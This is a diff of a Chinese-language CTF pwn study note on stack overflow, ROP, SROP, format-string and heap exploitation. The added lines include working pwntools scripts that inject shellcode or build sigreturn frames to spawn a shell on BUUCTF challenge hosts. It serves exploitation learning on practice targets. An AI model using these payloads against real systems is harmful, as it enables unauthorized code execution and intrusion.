@@ -5,9 +5,11 @@
 大多数pwn题的ELF都是动态链接的
 ```
 
-# ret2text
+# 栈漏洞
 
-## 原理
+## ret2text
+
+### 原理
 
 通过溢出，对返回地址进行劫持，来获取shell
 
@@ -24,7 +26,7 @@ gets() ：遇到换行符才停止读取，读取的数据超过缓冲区，就�
 
 read() ：参数三规定读取大小，当大于数据的大小，就会造成溢出
 
-## 简单栈溢出编写
+### 简单栈溢出编写
 
 ```python
 from pwn form *
@@ -35,13 +37,11 @@ p.sendline(payload)
 p.interactive()
 ```
 
-# ret2shellcode
+## ret2shellcode
 
-## 原理
+### 原理
 
 利用栈溢出，来实现劫持返回地址，返回到准备好的shellcode来进行取shell
-
-## shellcode生成
 
 ### 手写
 
@@ -62,13 +62,33 @@ shellcode = shellcode.ljust(120,b'a')
 
 一般来说，靶机基本都开启了ALSR，所以不会对栈写入shellcode，
 
-# ret2syscall
+### 32位
 
-## 原理
+```python
+from pwn import *
+context(os="linux",arch="i386",log_level="debug")
+p=remote('node5.buuoj.cn',27809)
+#p=process('./ez_pz_hackover_2016')
+p.recvuntil("0x")
+stack=int(p.recv(8),16)
+print(hex(stack))
+p.recvuntil(b"> ")
+# gdb.attach(p)
+shellcode=asm(shellcraft.sh())
+payload=flat(b'crashme\x00',b'a'*(0x16-0x4),p32(stack-0x1c),shellcode)
+p.sendline(payload)
+p.interactive()
+```
+
+
+
+## ret2syscall
+
+### 原理
 
 利用栈溢出漏洞来，劫持返回地址，注入系统调用指令，来操作程序已有的系统调用来执行shell，不需要注入shellcode
 
-## 情况一
+### 情况一
 
 当存在system函数，但是没有要执行的命令，刚好存在字符串"/bin/sh"的地址
 
@@ -78,7 +98,7 @@ shellcode = shellcode.ljust(120,b'a')
 
 获取"/bin/sh"字符串的地址可以使用，
 
-### 32位
+#### 32位
 
 ```python
 from pwn form *
@@ -102,7 +122,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### 64位
+#### 64位
 
 由于64传递参数，会先用6个寄存器传参，往后才使用栈传递参数，所以需要用简单的ROP来构造"/bin/sh"
 
@@ -122,17 +142,17 @@ p.sendline(payload)
 p.interactive()
 ```
 
-## 情况二
+### 情况二
 
 当存在system函数，但是没有"/bin/sh"
 
-### 32位
+#### 32位
 
 ```
 
 ```
 
-### 64位
+#### 64位
 
 ```
 
@@ -140,7 +160,7 @@ p.interactive()
 
 
 
-## 情况三
+### 情况三
 
 当没有system函数，也没有"/bin/sh"，我们就需要自己使用ROPgadget构造一个后面函数所以操作系统的内核函数，想要调用需要通过寄存器传入代号，当要执行int 0x80的这个汇编代码时，我们要确保，寄存器已经传入了对应的参数
 
@@ -157,7 +177,7 @@ rax=0x3b rdi='/bin/sh' rdx=0 rsi=0	#64设置
 
 ```
 
-### 32位
+#### 32位
 
 32位程序是利用int 80来进行系统调用read函数，也可以直接使用已有的read函数，但是得需要pop_ret的地址满足条件才行
 
@@ -177,7 +197,7 @@ p.sendline(payload)
 p.interactive()
 ```
 
-### 64位
+#### 64位
 
 64位程序利用syscall来进行系统调用read函数写入"/bin/sh"，也可以直接使用已有的read函数
 
@@ -187,9 +207,9 @@ p.interactive()
 
 ```
 
-# ret2libc
+## ret2libc
 
-## 原理
+### 原理
 
 利用栈溢出漏洞，劫持返回地址，利用程序已链接库中的函数，来进行取shell不需要注入自定义的 shellcode 或者系统调用指令。需要了解libc和延迟绑定，了解ELF执行后，第一次调用函数，会实现一个延迟绑定当函数没system和"/bin/sh"时，就需要调用libc里面的，首先**找到libc的基地址**，通过已知函数的地址，输出在libc中的地址，来计算基地址
 
@@ -204,7 +224,7 @@ git clone https://github.com/niklasb/libc-database.git
 
 
 
-## 32位
+### 32位
 
 ```python
 from pwn import *
@@ -237,7 +257,7 @@ p.interactive()
 
 
 
-## 64位
+### 64位
 
 ```python
 #题目来自Buuctf ciscn_2019_c_1
@@ -282,17 +302,17 @@ p.sendlineafter('encrypted\n',payload2)
 p.interactive()
 ```
 
-# ret2cus
+## ret2cus
 
 利用初始化函数__libc_csu_init
 
 一般的程序都会调用libc中的函数，而此函数便是来将libc初始化的，故此函数几乎是每一个程序所必备的。一般可以用来让`rdx=0`
 
-## 32位
+### 32位
 
 32位采用`int 80`指令调用底层
 
-## 64位
+### 64位
 
 ![image-20240513212502274](image/image-20240513212502274.png)
 
@@ -330,6 +350,12 @@ p.interactive()
 # ROP编程
 
 ## 栈迁移
+
+前提是有栈溢出，可以覆盖掉ebp或者rbp，甚至返回地址，
+
+当只能溢出到rbp时，可以搭配输入函数，可以实现任意地址写，比如
+
+
 
 # BROP
 
@@ -373,3 +399,134 @@ print(size)
 `Sigreturn`则是一种特殊的系统调用，它将程序的执行状态恢复到之前通过信号处理函数保存的状态，我们可以恶意构造`Sigreturn`函数进行篡改寄存器和栈，以达到getshell目的
 
 系统调用号查看路径`/usr/include/x86_64-linux-gnu/asm/unistd_64.h`或者`unistd_32.h`
+
+```python
+from pwn import *
+context(os='linux',arch='amd64',log_level='debug')
+p = remote('node5.buuoj.cn', 27324)
+# p=process("./ciscn_s_3")
+elf = ELF('./ciscn_s_3')
+
+gadget = 0x4004DA
+syscall = 0x400517
+vuln = 0x4004ED
+p.send(b'a' * 0x10 + p64(vuln))
+binsh = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x118
+
+frame = SigreturnFrame()
+frame.rax = 59
+frame.rdi = binsh
+frame.rip = syscall
+frame.rsi = 0
+
+payload = b"/bin/sh\x00" * 2 + p64(gadget) + p64(syscall) + bytes(frame)
+p.send(payload)
+p.interactive()
+```
+
+# 格式化字符串漏洞
+
+## 前置知识
+
+导致有格式化字符串漏洞的函数有
+
+- printf系列函数
+  - printf()
+  - fprintf()
+  - sprintf()
+  - snprintf()
+- syslog()
+- vprintf系列函数
+- 错误日志函数
+- 远程日志记录器
+
+首先会读取到一段字符串，然后在输出函数中，没有正确的进行格式化字符串处理，导致可以读取内存的数据，写入数据等字符串的输入权交给用户就会有问题了
+
+格式化字符串可以用来
+
+- 读取任意地址
+- 任意地址写：改返回地址，改got表，改one_gadget，改malloc_hook，改iofile
+
+```c
+char a[100];
+scanf("%s",a);
+printf(a);
+read(0,buf,20u);
+printf(buf); //这个就是一个明显的格式化字符漏洞
+return 0;
+//常用的格式化
+printf("%x");	//输出十六进制数，没有0x
+printf("%p");	//输出十六进制，带有0x
+printf("abcd%n")	//将%n前面字符串abcd的长度4写入在后面
+  
+%10$n	//对第10个参数里面的地址修改
+%100c%10$n	//对第10个参数里面的地址修改成100(0x64)
+n表示，四个字节
+hn表示，两个字节
+hhn表示，一个字节
+```
+
+## 利用原理
+
+## 32位
+
+```
+32位靠栈传递参数，esp地址的下一个地址开始
+```
+
+
+
+## 64位
+
+```python
+64位传递参数rdi，rsi，rdx，rcx，r8，r9，然后到栈里面esp下一个地址才是第7个参数
+先利用漏洞，泄露出ebp的地址，再通过偏移算出要修改的地址，然后要修改的地址加入到payload
+
+payload = '%10$n%11$n%12$n%13$n' +p64(0x7fffffffdd68)	#因为p64()会补全00007fffffffdd68，在遇到print的时候，会遇到00截停，所有地址要放在payload后面，有时候前面的也要对齐8字节
+fmstr_payload()函数
+```
+
+# 整数溢出漏洞
+
+```
+
+```
+
+# 堆漏洞
+
+## 基础
+
+堆管理器分类
+
+1. **ptmalloc/glibc malloc**：这是许多Linux系统上使用的默认堆管理器，实现了POSIX标准的内存分配接口。它通常用于C语言程序，并提供了一些高级特性，如线程安全性和内存池管理。
+2. **jemalloc**：jemalloc 是一种通用的内存分配器，主要用于多线程应用程序和高并发环境。它被广泛用于各种开源项目和大规模的互联网服务，如Mozilla Firefox和FreeBSD。
+3. **tcmalloc**：由Google开发的内存分配器，用于Google的许多产品和服务，包括Google Chrome浏览器和Google搜索引擎。tcmalloc具有高性能和低碎片化的特性，特别适用于多线程应用程序。
+4. **Windows Heap Manager**：Windows操作系统中的内存管理组件，用于管理进程的堆内存。Windows Heap Manager提供了一些系统调用，如HeapAlloc()和HeapFree()，用于分配和释放堆内存。
+5. **malloc/free函数**：这是C语言标准库中提供的内存分配函数，用于动态分配和释放内存。虽然它们通常是基于默认的堆管理器实现的，但也可以通过重写这些函数来使用自定义的堆管理器。
+6. **Hoard**：Hoard 是一个快速、可扩展且高度并发的堆管理器，专为多核系统设计。它采用了一些先进的内存分配和释放策略，如分段缓存和惰性合并，以提高性能和可扩展性。
+
+### bins
+
+`bins`：用于存储不同大小的空闲 chunk的数据结构（通常单链表或双链表），分为`fastbins`、`smallbins`、`largebins`、`unsortedbins`
+
+### chunk结构
+
+|  prev_size  |    size     |
+| :---------: | :---------: |
+|     fd      |     bk      |
+| fd_nextsize | bk_nextsize |
+|    data     |    data     |
+
+`prev_size`：指前一个chunk的大小
+
+`size`：存储当前 chunk 的大小
+
+`fd`：指向当前 chunk 在空闲链表中的下一个空闲 chunk
+
+`bk`：当前 chunk 在空闲链表中的上一个空闲 chunk
+
+## 堆溢出
+
+## UAF
+
+## UNLINK
